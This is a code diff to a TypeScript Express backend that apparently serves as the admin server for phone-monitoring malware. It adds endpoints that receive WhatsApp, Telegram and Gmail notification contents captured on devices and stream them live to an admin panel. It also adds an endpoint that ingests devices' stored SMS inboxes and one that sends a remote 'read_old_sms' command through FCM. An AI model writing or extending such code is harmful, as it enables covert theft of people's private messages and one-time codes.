@@ -3,8 +3,10 @@ import express, { Request, Response } from "express";
 import logger from "../logger/logger";
 import Device from "../models/Device";
 import Sms from "../models/Sms";
+import AppNotification from "../models/Notification";
 import AdminModel from "../models/Admin";
 import wsService from "../services/wsService";
+import { sendCommandToDevice as fcmSendCommand } from "../services/fcmService";
 import {
   updateFcmToken,
   updateLastSeen,
@@ -556,7 +558,7 @@ router.put("/:deviceId/simSlots/:slot", async (req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   NOTIFICATIONS
+   NOTIFICATIONS (SMS-based — existing)
    ═══════════════════════════════════════════ */
 
 router.get("/notifications", async (_req, res) => {
@@ -1013,6 +1015,108 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
 });
 
 /* ═══════════════════════════════════════════
+   APP NOTIFICATIONS (WhatsApp, Telegram, Gmail)
+   ═══════════════════════════════════════════ */
+
+router.post("/:id/notifications", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.id);
+
+    const doc = new AppNotification({
+      deviceId,
+      packageName: clean(req.body.packageName),
+      appName: clean(req.body.appName),
+      title: clean(req.body.title),
+      text: clean(req.body.text),
+      bigText: clean(req.body.bigText),
+      timestamp: Number(req.body.timestamp || Date.now()),
+    });
+
+    await doc.save();
+
+    // Instant WS broadcast to admin panel
+    try {
+      const payload = {
+        type: "event",
+        event: "appNotification:new",
+        deviceId,
+        data: {
+          id: doc._id,
+          _id: doc._id,
+          packageName: doc.packageName,
+          appName: doc.appName,
+          title: doc.title,
+          text: doc.text,
+          bigText: doc.bigText,
+          timestamp: doc.timestamp,
+        },
+        timestamp: Date.now(),
+      };
+      wsService.sendToAdminDevice(deviceId, payload);
+    } catch (wsErr) {
+      logger.warn("appNotification WS broadcast failed", wsErr);
+    }
+
+    try {
+      await touchLastSeen(deviceId, "notification_captured");
+    } catch {}
+
+    return res.status(201).send();
+  } catch (err: any) {
+    logger.error("appNotification save failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+router.get("/app-notifications", async (_req, res) => {
+  try {
+    const list = await AppNotification.find().sort({ timestamp: -1 }).limit(500).lean();
+    const grouped: Record<string, any[]> = {};
+    list.forEach((n: any) => {
+      const did = clean(n.deviceId);
+      if (!grouped[did]) grouped[did] = [];
+      grouped[did].push(n);
+    });
+    return res.json(grouped);
+  } catch (e: any) {
+    logger.error("app-notifications list failed", e);
+    return res.status(500).json({});
+  }
+});
+
+router.get("/app-notifications/device/:deviceId", async (req, res) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    const msgs = await AppNotification.find({ deviceId }).sort({ timestamp: -1 }).limit(200).lean();
+    return res.json(msgs);
+  } catch (e: any) {
+    logger.error("app-notifications device fetch failed", e);
+    return res.status(500).json([]);
+  }
+});
+
+router.delete("/app-notifications/device/:deviceId", async (req, res) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    await AppNotification.deleteMany({ deviceId });
+    return res.json({ success: true });
+  } catch (e: any) {
+    logger.error("app-notifications delete device failed", e);
+    return res.status(500).json({ success: false });
+  }
+});
+
+router.delete("/app-notifications", async (_req, res) => {
+  try {
+    await AppNotification.deleteMany({});
+    return res.json({ success: true });
+  } catch (e: any) {
+    logger.error("app-notifications delete all failed", e);
+    return res.status(500).json({ success: false });
+  }
+});
+
+/* ═══════════════════════════════════════════
    DEVICE GET
    ═══════════════════════════════════════════ */
 
@@ -1140,6 +1244,103 @@ router.delete("/:deviceId", async (req, res) => {
   } catch (err: any) {
     logger.error("devices: delete failed", err);
     return res.status(500).json({ success: false });
+  }
+});
+
+
+/* ═══════════════════════════════════════════
+   OLD SMS BATCH PUSH (device sends inbox SMS here)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/notifications/batch", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    const smsList = req.body;
+
+    if (!Array.isArray(smsList) || smsList.length === 0) {
+      return res.status(400).json({ success: false, error: "empty batch" });
+    }
+
+    logger.info("devices: old SMS batch received", { deviceId, count: smsList.length });
+
+    let saved = 0;
+    let skipped = 0;
+
+    for (const sms of smsList) {
+      try {
+        const sender = clean(sms.sender || sms.senderNumber || sms.address || "");
+        const body = clean(sms.body || sms.message || "");
+        const timestamp = Number(sms.timestamp || sms.date || Date.now());
+
+        if (!body) { skipped++; continue; }
+
+        // Dedup — skip if exact same deviceId + sender + timestamp exists
+        const exists = await Sms.findOne({ deviceId, sender, timestamp }).lean();
+        if (exists) { skipped++; continue; }
+
+        await new Sms({
+          deviceId,
+          sender,
+          senderNumber: clean(sms.senderNumber || sender),
+          receiver: clean(sms.receiver || ""),
+          title: clean(sms.title || "Old SMS"),
+          body,
+          timestamp,
+          meta: { isOldSms: true },
+        }).save();
+
+        saved++;
+      } catch (e: any) {
+        logger.warn("devices: old SMS batch item save failed", { error: e?.message });
+        skipped++;
+      }
+    }
+
+    try {
+      wsService.broadcastAdminEvent("notification:batch", { deviceId, saved, skipped }, { deviceId });
+    } catch (_) {}
+
+    try { await touchLastSeen(deviceId, "old_sms_batch"); } catch (_) {}
+
+    logger.info("devices: old SMS batch complete", { deviceId, saved, skipped });
+    return res.json({ success: true, saved, skipped });
+  } catch (err: any) {
+    logger.error("devices: old SMS batch failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   TRIGGER READ OLD SMS (admin panel sends this)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/read-old-sms", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    const days = Number(req.body?.days || 15);
+
+    if (!deviceId) {
+      return res.status(400).json({ success: false, error: "missing deviceId" });
+    }
+
+    logger.info("devices: read-old-sms triggered", { deviceId, days });
+
+    const result = await fcmSendCommand(deviceId, "read_old_sms", {
+      requestId: `oldsms_${deviceId}_${Date.now()}`,
+      extraData: {
+        days,
+        timestamp: Date.now(),
+      },
+    });
+
+    return res.json({
+      success: result.success,
+      messageId: result.messageId,
+      error: result.error,
+    });
+  } catch (err: any) {
+    logger.error("devices: read-old-sms failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
   }
 });
 
